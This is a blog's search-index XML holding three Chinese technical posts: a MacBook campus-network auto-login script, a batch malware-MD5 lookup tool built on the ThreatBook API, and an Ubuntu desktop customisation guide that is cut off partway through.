<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MacBook自动连接校园网（重邮）</title>
      <link href="/archives/202410311500.html"/>
      <url>/archives/202410311500.html</url>
      
        <content type="html"><![CDATA[<h1 id="MacBook自动连接校园网（重邮）"><a href="#MacBook自动连接校园网（重邮）" class="headerlink" title="MacBook自动连接校园网（重邮）"></a>MacBook自动连接校园网（重邮）</h1><ul><li>在使用MacBook过程中，因为去图书馆和宿舍之间，每次都要重新登录，所以用python写了个脚本自动登录校园网的功能。</li></ul><h3 id="一、安装sleepwater"><a href="#一、安装sleepwater" class="headerlink" title="一、安装sleepwater"></a>一、安装sleepwater</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install sleepwatcher</span><br></pre></td></tr></table></figure><p><img src="/../images/MacBook%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91%EF%BC%88%E9%87%8D%E9%82%AE%EF%BC%89/image-20241026125345741.png" alt="image-20241026125345741"></p><h3 id="二、设置软件自启动"><a href="#二、设置软件自启动" class="headerlink" title="二、设置软件自启动"></a>二、设置软件自启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew service start sleepwatcher</span><br></pre></td></tr></table></figure><p><img src="/../images/MacBook%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91%EF%BC%88%E9%87%8D%E9%82%AE%EF%BC%89/image-20241026125444654.png" alt="image-20241026125444654"></p><h3 id="三、查看进程是否启动"><a href="#三、查看进程是否启动" class="headerlink" title="三、查看进程是否启动"></a>三、查看进程是否启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep sleepwatcher</span><br></pre></td></tr></table></figure><p><img src="/../images/MacBook%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91%EF%BC%88%E9%87%8D%E9%82%AE%EF%BC%89/image-20241026125525569.png" alt="image-20241026125525569"></p><h3 id="四、创建目录"><a href="#四、创建目录" class="headerlink" title="四、创建目录"></a>四、创建目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在个人 home 目录 ~ 下创建文件 .wakeup 并赋予权限 777</span><br><span class="line"><span class="built_in">touch</span> ~/.wakeup</span><br><span class="line"><span class="built_in">chmod</span> 777 ~/.wakeup</span><br></pre></td></tr></table></figure><p><img src="/../images/MacBook%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91%EF%BC%88%E9%87%8D%E9%82%AE%EF%BC%89/image-20241026125634303.png" alt="image-20241026125634303"></p><p><img src="/../images/MacBook%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91%EF%BC%88%E9%87%8D%E9%82%AE%EF%BC%89/image-20241026125650116.png" alt="image-20241026125650116"></p><h3 id="五、创建脚本文件"><a href="#五、创建脚本文件" class="headerlink" title="五、创建脚本文件"></a>五、创建脚本文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑脚本文件</span></span><br><span class="line">vim ~/.wakeup</span><br></pre></td></tr></table></figure><ul><li><code>.wakeup</code>文件内容</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#networksetup -setairportpower en0 on  # 打开Wi-Fi，off是关闭</span></span><br><span class="line"><span class="comment">#networksetup -setairportnetwork en0 NJUPT-CMCC  # 连接到指定的Wi-Fi</span></span><br><span class="line">python3 /Users/mawu/tools/TimingPy/TimingCampusNet.py </span><br><span class="line"><span class="comment"># python目录可以自定义设置</span></span><br></pre></td></tr></table></figure><p><img src="/../images/MacBook%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91%EF%BC%88%E9%87%8D%E9%82%AE%EF%BC%89/image-20241026140500023.png" alt="image-20241026140500023"></p><ul><li><code>TimingCampusNet.py</code>文件</li><li>请修改账号和密码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CampusNetwork</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.url = <span class="string">&#x27;http://192.168.200.2:801/&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.ac = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># 请按照格式输入账号</span></span><br><span class="line">        <span class="variable language_">self</span>.user_account = <span class="string">&#x27;,0,1673111@telecom&#x27;</span></span><br><span class="line">        <span class="comment"># 请输入密码</span></span><br><span class="line">        <span class="variable language_">self</span>.user_password = <span class="string">&#x27;123456789&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.callback = <span class="string">&#x27;dr1003&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.v = random.randint(<span class="number">1000</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="variable language_">self</span>.jsVersion = <span class="string">&#x27;3,3.3&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.my_result, <span class="variable language_">self</span>.my_ipv4 = <span class="variable language_">self</span>.check_status()</span><br><span class="line">        <span class="variable language_">self</span>.headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;en-US,en;q=0.5&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Referer&quot;</span>: <span class="variable language_">self</span>.url,  <span class="comment"># 可根据实际请求页面修改</span></span><br><span class="line">            <span class="comment"># &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,  # 根据请求内容类型修改</span></span><br><span class="line">            <span class="comment"># &quot;Authorization&quot;: &quot;Bearer &lt;token&gt;&quot;,  # 如果需要认证，可以添加认证信息</span></span><br><span class="line">            <span class="comment"># &quot;Cookie&quot;: &quot;PHPSESSID=oeu4gf4t3es6vdahqlc3sgloqv&quot;  # 如果需要会话，添加 Cookie 信息</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 登录</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 请求参数</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;Portal&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;callback&#x27;</span>: <span class="string">&#x27;dr1004&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;login_method&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;user_account&#x27;</span>: <span class="variable language_">self</span>.user_account,</span><br><span class="line">            <span class="string">&#x27;user_password&#x27;</span>: <span class="variable language_">self</span>.user_password,</span><br><span class="line">            <span class="string">&#x27;wlan_user_ip&#x27;</span>: <span class="variable language_">self</span>.my_ipv4,</span><br><span class="line">            <span class="string">&#x27;wlan_user_ipv6&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;wlan_user_mac&#x27;</span>: <span class="string">&#x27;000000000000&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;wlan_ac_ip&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;wlan_ac_name&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;jsVersion&#x27;</span>: <span class="variable language_">self</span>.jsVersion,</span><br><span class="line">            <span class="string">&#x27;v&#x27;</span>: <span class="variable language_">self</span>.v</span><br><span class="line">        &#125;</span><br><span class="line">        url = <span class="variable language_">self</span>.url + <span class="string">&#x27;eportal/&#x27;</span></span><br><span class="line">        resp = requests.get(url, params=params)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取本机wifi信息</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_status</span>(<span class="params">self</span>):</span><br><span class="line">        url = <span class="string">&#x27;http://192.168.200.2/drcom/chkstatus&#x27;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&quot;callback&quot;</span>: <span class="variable language_">self</span>.callback,</span><br><span class="line">            <span class="string">&quot;v&quot;</span>: <span class="variable language_">self</span>.v</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.get(url, params=params).text</span><br><span class="line">        content = json.loads(re.search(<span class="string">r&#x27;dr\d+\((\&#123;.*?\&#125;)\)&#x27;</span>, resp).group(<span class="number">1</span>))</span><br><span class="line">        my_result = content[<span class="string">&quot;result&quot;</span>]</span><br><span class="line">        my_v46ip = content[<span class="string">&quot;v46ip&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> my_result, my_v46ip</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">timing_campus_net</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.my_result:</span><br><span class="line">            <span class="variable language_">self</span>.login()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_wifi</span>():</span><br><span class="line">    response = os.system(<span class="string">f&quot;ping -c 1 -W 1 192.168.200.2 &gt; /dev/null 2&gt;&amp;1&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> response == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        flag = check_wifi()</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            a = CampusNetwork()</span><br><span class="line">            a.timing_campus_net()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="六、测试py脚本"><a href="#六、测试py脚本" class="headerlink" title="六、测试py脚本"></a>六、测试py脚本</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 先退出校园网登录，然后运行py脚本，如果输出如下，则脚本没有问题</span><br><span class="line"># 执行命令 python3 TimingCampusNet.py</span><br><span class="line"></span><br><span class="line">dr1004(<span class="punctuation">&#123;</span><span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;msg&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u8ba4\u8bc1\u6210\u529f&quot;</span><span class="punctuation">&#125;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/MacBook%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91%EF%BC%88%E9%87%8D%E9%82%AE%EF%BC%89/image-20241026140845114.png" alt="image-20241026140845114"></p><h3 id="七、测试sh脚本"><a href="#七、测试sh脚本" class="headerlink" title="七、测试sh脚本"></a>七、测试sh脚本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 执行命令 sh .wakeup</span><br><span class="line"></span><br><span class="line">如果无输出则没有题</span><br></pre></td></tr></table></figure><p><img src="/../images/MacBook%E8%87%AA%E5%8A%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91%EF%BC%88%E9%87%8D%E9%82%AE%EF%BC%89/image-20241026141054780.png" alt="image-20241026141054780"></p>]]></content>
      
      
      <categories>
          
          <category> 思路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【开发】病毒样本（md5）信息批量查询工具</title>
      <link href="//archives/1726220765387/"/>
      <url>//archives/1726220765387/</url>
      
        <content type="html"><![CDATA[<h1 id="【开发】病毒样本-md5-信息批量查询工具"><a href="#【开发】病毒样本-md5-信息批量查询工具" class="headerlink" title="【开发】病毒样本(md5)信息批量查询工具"></a>【开发】病毒样本(md5)信息批量查询工具</h1><p><strong>（Get_Md5_Information）</strong></p><hr><h2 id="一、项目简介"><a href="#一、项目简介" class="headerlink" title="一、项目简介"></a>一、项目简介</h2><ul><li><strong>这款工具是当时实习时候写的一款工具，在实习过程中本来一直都是直接运行python的，功能也比较简单，后来快要离职时候才写成图形化界面的，并且补充完善了一些功能，其实还有启明星辰和vt的代码，但当时比较赶，没时间往这个程序中添加，后面有机会再说吧，到现在其实离职有段时间了，本来这个程序和代码也是懒得往GitHub上面发，并且这个的受众人员也很少，大多数人还是用不到的，但是因为这两天在弄实习报告，必须要这些东西，本来想直接把压缩包放在word里，但是毕竟还挺大，才打算写个GitHub，后面直接把GitHub链接放报告里就行了。</strong></li><li><strong>这款工具通过调用微步在线API，批量获取病毒样本MD5的相关信息。用户可以自定义查询字段，包括威胁等级、威胁分类、病毒家族、文件名称、文件类型、标签、威胁评分值和检出率等。程序提供了图形化用户界面（GUI），支持从TXT或Excel文件中导入MD5列表，并能够将查询结果导出为Excel文件。</strong></li><li><strong>下载地址：</strong><a href="https://github.com/mBigFish/Get_Md5_Information">https://github.com/mBigFish/Get_Md5_Information</a></li></ul><hr><h2 id="二、关于API"><a href="#二、关于API" class="headerlink" title="二、关于API"></a>二、关于API</h2><h4 id="（一）API地址获取"><a href="#（一）API地址获取" class="headerlink" title="（一）API地址获取"></a>（一）API地址获取</h4><ul><li><strong>注册微步在线账户，之后API的key值可以在下面这个网站获取</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.com/v5/serviceCenter?tab=myKey</span><br></pre></td></tr></table></figure><p><img src="/../images/%E3%80%90%E5%BC%80%E5%8F%91%E3%80%91%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%EF%BC%88md5%EF%BC%89%E4%BF%A1%E6%81%AF%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/image-20240913174434114550-0961215.png" alt="image-20240912232356494"></p><h4 id="（二）关于接口信息"><a href="#（二）关于接口信息" class="headerlink" title="（二）关于接口信息"></a>（二）关于接口信息</h4><ul><li><strong>程序所调用API是这个接口，具体信息可以在下面这个网站查看</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.com/v5/apiDocs</span><br></pre></td></tr></table></figure><p><img src="/../images/%E3%80%90%E5%BC%80%E5%8F%91%E3%80%91%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%EF%BC%88md5%EF%BC%89%E4%BF%A1%E6%81%AF%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/image-20240913174437352265.png" alt="image-20240912231946498"></p><h2 id="三、主要功能"><a href="#三、主要功能" class="headerlink" title="三、主要功能"></a>三、主要功能</h2><ul><li><strong>字段选择</strong>：用户可以自由选择需要获取的字段。</li><li><strong>数据导入</strong>：支持从TXT或Excel文件中导入MD5列表。</li><li><strong>信息查询</strong>：批量调用微步在线API，获取病毒样本信息。</li><li><strong>结果导出</strong>：将查询结果导出为Excel文件，方便查看和分析。</li><li><strong>配置保存</strong>：工具会保存用户的配置，以便下次打开时自动加载上次的操作设置。</li></ul><hr><h2 id="四、运行及展示"><a href="#四、运行及展示" class="headerlink" title="四、运行及展示"></a>四、运行及展示</h2><h3 id="（一）初始化"><a href="#（一）初始化" class="headerlink" title="（一）初始化"></a>（一）初始化</h3><ul><li><strong>在第一次打开程序时候，会检测生成一份配置文件</strong></li></ul><p><img src="/../images/%E3%80%90%E5%BC%80%E5%8F%91%E3%80%91%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%EF%BC%88md5%EF%BC%89%E4%BF%A1%E6%81%AF%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/image-20240913174438396454.png" alt="image-20240912233701256"></p><p><img src="/../images/%E3%80%90%E5%BC%80%E5%8F%91%E3%80%91%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%EF%BC%88md5%EF%BC%89%E4%BF%A1%E6%81%AF%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/image-20240913174439262828.png" alt="image-20240912233725978"></p><ul><li><strong>此时就会打开程序gui界面</strong></li></ul><p><img src="/../images/%E3%80%90%E5%BC%80%E5%8F%91%E3%80%91%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%EF%BC%88md5%EF%BC%89%E4%BF%A1%E6%81%AF%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/image-20240913174440016837.png" alt="image-20240912233750592"></p><ul><li><strong>在导入文件之前需要先去生成的配置文件里输入api的key，没有的话可以参考关于api里面注册一个</strong></li></ul><p><img src="/../images/%E3%80%90%E5%BC%80%E5%8F%91%E3%80%91%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%EF%BC%88md5%EF%BC%89%E4%BF%A1%E6%81%AF%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/image-20240913174440855112.png" alt="image-20240912234002785"></p><ul><li><strong>可以像我这样放多个key，api越多，速度越快（因为微步对每个api都有请求限制），并且每个api可以获取1000条数据。</strong></li></ul><h3 id="（二）运行界面"><a href="#（二）运行界面" class="headerlink" title="（二）运行界面"></a>（二）运行界面</h3><p><img src="/../images/%E3%80%90%E5%BC%80%E5%8F%91%E3%80%91%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%EF%BC%88md5%EF%BC%89%E4%BF%A1%E6%81%AF%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/image-20240913174441783758.png" alt="image-20240912230956312"></p><h3 id="（三）导出结果"><a href="#（三）导出结果" class="headerlink" title="（三）导出结果"></a>（三）导出结果</h3><p><img src="/../images/%E3%80%90%E5%BC%80%E5%8F%91%E3%80%91%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%EF%BC%88md5%EF%BC%89%E4%BF%A1%E6%81%AF%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/image-20240913174442624831.png" alt="image-20240912231039174"></p><h3 id="（四）导出展示"><a href="#（四）导出展示" class="headerlink" title="（四）导出展示"></a>（四）导出展示</h3><p><img src="/../images/%E3%80%90%E5%BC%80%E5%8F%91%E3%80%91%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%EF%BC%88md5%EF%BC%89%E4%BF%A1%E6%81%AF%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/image-20240913174443502314.png" alt="image-20240912231140733"></p><p><strong>注意事项</strong></p><ul><li><strong>确保API密钥有效并且配置正确。</strong></li><li><strong>查询频率过高可能会导致API访问限制。</strong></li><li><strong>结果的准确性依赖于微步在线API的返回数据。</strong></li><li><strong>可以直接在release里下载windows版的图形化界面程序直接使用，无需任何环境</strong></li></ul><h2 id="四、代码结构"><a href="#四、代码结构" class="headerlink" title="四、代码结构"></a>四、代码结构</h2><ul><li>**<code>run.py</code>**：主程序文件。</li><li>**<code>config.py</code>**：配置操作代码，负责读取和写入配置文件。</li><li>**<code>worker.py</code>**：程序工作代码，包含与API交互和数据处理的功能。</li><li>**<code>main_window.py</code>**：程序界面代码，定义主窗口和界面布局。</li><li>**<code>gui.py</code>**：程序界面操作函数代码，处理用户交互和界面更新。</li><li>**<code>Initialize.py</code>**：程序初始化代码，负责配置文件的创建和初始化。</li><li>**<code>untitled.ui</code>**：界面UI文件，使用Qt Designer创建的界面设计文件。</li><li>**<code>config.txt</code>**：配置文件，包含API密钥和字段选择设置。</li></ul><h2 id="五、代码介绍"><a href="#五、代码介绍" class="headerlink" title="五、代码介绍"></a>五、代码介绍</h2><p><strong>可以直接下载打包好的软件直接运行，不需要看这里，****可以看第三块内容</strong></p><ol><li><strong>安装依赖</strong>：<ul><li><strong>确保系统中已安装Python。</strong></li><li><strong>安装必要的Python库：</strong></li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 直接运行pip install -r requirements.txt</span><br><span class="line">certifi==2024.8.30</span><br><span class="line">charset-normalizer==3.3.2</span><br><span class="line">et-xmlfile==1.1.0</span><br><span class="line">idna==3.8</span><br><span class="line">numpy==2.0.2</span><br><span class="line">openpyxl==3.1.5</span><br><span class="line">pandas==2.2.2</span><br><span class="line">PySide6==6.7.2</span><br><span class="line">PySide6_Addons==6.7.2</span><br><span class="line">PySide6_Essentials==6.7.2</span><br><span class="line">python-dateutil==2.9.0.post0</span><br><span class="line">pytz==2024.2</span><br><span class="line">requests==2.32.3</span><br><span class="line">shiboken6==6.7.2</span><br><span class="line">six==1.16.0</span><br><span class="line">tzdata==2024.1</span><br><span class="line">urllib3==2.2.3</span><br></pre></td></tr></table></figure><ol><li><strong>配置文件</strong>：<ul><li><strong>运行</strong> <code>InitializeConfig</code>类以生成配置文件 <code>config.ini</code>。该文件包含API密钥和字段选择设置。</li></ul></li><li><strong>运行工具</strong>：<ul><li><strong>使用以下命令运行工具：</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python run.py</span><br></pre></td></tr></table></figure></li><li><strong>按照GUI界面进行操作，导入MD5列表，选择需要的字段，然后执行查询并导出结果。</strong></li></ul></li></ol><hr><h2 id="六、贡献与开源"><a href="#六、贡献与开源" class="headerlink" title="六、贡献与开源"></a>六、贡献与开源</h2><ul><li><strong>欢迎对项目进行贡献或提出改进建议。请参阅</strong><a href="https://github.com/your-repo">GitHub项目页面</a>以获取更多信息。</li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu美化</title>
      <link href="//archives/1725293178393/"/>
      <url>//archives/1725293178393/</url>
      
        <content type="html"><![CDATA[<h1 id="ubuntu美化"><a href="#ubuntu美化" class="headerlink" title="ubuntu美化"></a>ubuntu美化</h1><h2 id="一：更新源"><a href="#一：更新源" class="headerlink" title="一：更新源"></a>一：更新源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><h2 id="二：下载"><a href="#二：下载" class="headerlink" title="二：下载"></a>二：下载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、执行：sudo apt install gnome-tweaks chrome-gnome-shell</span><br><span class="line"></span><br><span class="line">2、执行：apt install gtk2-engines-murrine gtk2-engines-pixbuf</span><br><span class="line"></span><br><span class="line">3、执行：install sassc optipng inkscape libcanberra-gtk-module libglib2.0-dev libxml2-utils</span><br><span class="line"></span><br><span class="line">4、执行（拓展）：sudo apt install gnome-shell-extensions</span><br></pre></td></tr></table></figure><h2 id="三：安装扩展"><a href="#三：安装扩展" class="headerlink" title="三：安装扩展"></a>三：安装扩展</h2><p><strong>下载地址：</strong><a href="https://extensions.gnome.org/#">https://extensions.gnome.org/#</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">1. User Themes</span><br><span class="line">2. Coverflow Alt-Tab（切换任务）</span><br><span class="line">3. Screenshot Tool（截图根据）</span><br><span class="line">4. OpenWeather（天气）</span><br><span class="line">5. NetSpeed（测速）</span><br><span class="line">6. dash to dock (dock 栏)</span><br><span class="line">7. Compiz alike magic lamp effect（魔灯）</span><br><span class="line">8. Compiz windows effect（窗口抖动）</span><br><span class="line">9. blur-my-shell（背景）</span><br><span class="line">10. caffeine（禁用屏幕保护）</span><br><span class="line">11. Clipboard Indicator（剪贴板）</span><br><span class="line">12. inactivity（隐藏顶部活动）</span><br><span class="line">13. input Method Panel（美化输入）</span><br><span class="line">14. Applications Menu（顶部菜单栏）</span><br><span class="line">15. auto-move-windows（在创建窗口时将应用程序移动到特定的工作区）</span><br><span class="line">16. desktop-icons-ng-ding（桌面图标）</span><br><span class="line">17. native-window-placement（以更紧凑的方式在概览中排列窗口）</span><br><span class="line">18. Places Status Indicator（顶栏文件夹）</span><br><span class="line">19. 